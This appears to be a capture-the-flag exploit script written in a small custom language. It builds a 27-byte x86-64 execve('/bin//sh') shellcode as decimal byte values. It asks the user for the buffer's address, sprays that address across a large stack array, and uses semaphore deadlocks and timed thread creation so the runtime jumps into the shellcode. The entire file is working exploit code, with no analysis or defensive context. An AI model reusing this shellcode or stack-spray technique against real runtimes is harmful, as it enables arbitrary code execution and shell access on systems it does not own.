ref<array<char, 27>> shellcode = new<array<char, 27>>();


def uint64 get_ptr() {
  deref(shellcode)[0] = 49;
  deref(shellcode)[1] = 192;
  deref(shellcode)[2] = 72;
  deref(shellcode)[3] = 187;
  deref(shellcode)[4] = 209;
  deref(shellcode)[5] = 157;
  deref(shellcode)[6] = 150;
  deref(shellcode)[7] = 145;
  deref(shellcode)[8] = 208;
  deref(shellcode)[9] = 140;
  deref(shellcode)[10] = 151;
  deref(shellcode)[11] = 255;
  deref(shellcode)[12] = 72;
  deref(shellcode)[13] = 247;
  deref(shellcode)[14] = 219;
  deref(shellcode)[15] = 83;
  deref(shellcode)[16] = 84;
  deref(shellcode)[17] = 95;
  deref(shellcode)[18] = 153;
  deref(shellcode)[19] = 82;
  deref(shellcode)[20] = 87;
  deref(shellcode)[21] = 84;
  deref(shellcode)[22] = 94;
  deref(shellcode)[23] = 176;
  deref(shellcode)[24] = 59;
  deref(shellcode)[25] = 15;
  deref(shellcode)[26] = 5;

  print(shellcode);
  print("\nEnter the pointer on the previous line without the 0x prefix but with however much padding is required to make it 16 nibbles long: ");
  string message = read(16);
  if (size(message) != 16) {
    print("Pointer is not 16 bytes long!\n");
  }
  
  return hex64(message);
}

def void fill_stack(uint64 ptr) {
  int32 i = 0;
  array<uint64, 8192> arr;
  while (i < 8192) {
    arr[i] = ptr;
    i = i + 1;
  }
}
def void t_func(ref<semaphore> sem, uint64 ptr) {
  usleep(3 * 1000000);
  down(sem);
  
  fill_stack(ptr);
  usleep(4 * 1000000);
}

def void u_func() {
  semaphore deadlocker = 0;
  down(deadlocker);
}

def void v_func() {
  print("Other thread fully woke up?\n");
  usleep(1 * 1000000);
}

def string concatenate(string left, string right) {
  string s = make_string(size(left) + size(right));
  int32 i = 0;
  while (i < size(left)) {
    s[i] = left[i];
    i = i + 1;
  }
  int32 j = 0;
  while(j < size(right)) {
    s[i] = right[j];
    i = i + 1;
    j = j + 1;
  }
  return s;
}

def int32 main() {
  set_max_native_threads(3);
  
  ref<semaphore> sem = new<semaphore>(0);
  uint64 ptr = get_ptr();

  thread t = make_thread(t_func, sem, ptr);
  usleep(1 * 1000000);

  thread u = make_thread(u_func);
  usleep(3 * 1000000);

  up(sem);
  usleep(1 * 1000000);

  thread v = make_thread(v_func);
  usleep(2 * 1000000);
	return 0;
}